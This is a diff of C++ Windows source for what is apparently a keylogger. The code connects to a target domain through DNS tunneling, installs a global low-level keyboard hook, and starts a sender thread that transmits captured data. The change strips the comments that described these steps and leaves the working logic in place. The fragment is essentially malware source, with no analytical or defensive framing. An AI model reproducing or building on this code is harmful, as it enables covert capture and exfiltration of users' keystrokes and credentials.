@@ -18,7 +18,6 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
         return TRUE;
     }
     
-    // Establish connection via DNS tunneling
     int retryCount = 0;
     while ((connectionId = startConnection(TARGET_DOMAIN.c_str())) == -1) {
         retryCount++;
@@ -30,7 +29,7 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
         }
     }
     
-    // Install global keyboard hook
+
     _k_hook = SetWindowsHookEx(WH_KEYBOARD_LL, process_key, nullptr, 0);
     if (!_k_hook) {
         CloseHandle(mutex);
@@ -38,8 +37,8 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
     }
     
     keyboardLayout = GetKeyboardLayout(0);
+
     
-    // Start sender thread for async data transmission
     HANDLE hSenderThread = CreateThread(nullptr, 0, senderThread, nullptr, 0, nullptr);
     if (!hSenderThread) {
         UnhookWindowsHookEx(_k_hook);
@@ -47,14 +46,13 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
         return FALSE;
     }
     
-    // Message loop - keeps the hook active
     MSG msg;
     while (GetMessage(&msg, nullptr, 0, 0) > 0) {
         TranslateMessage(&msg);
         DispatchMessageW(&msg);
     }
     
-    // Cleanup
+
     shouldStopSender = true;
     if (hSenderThread) {
         WaitForSingleObject(hSenderThread, 5000);  
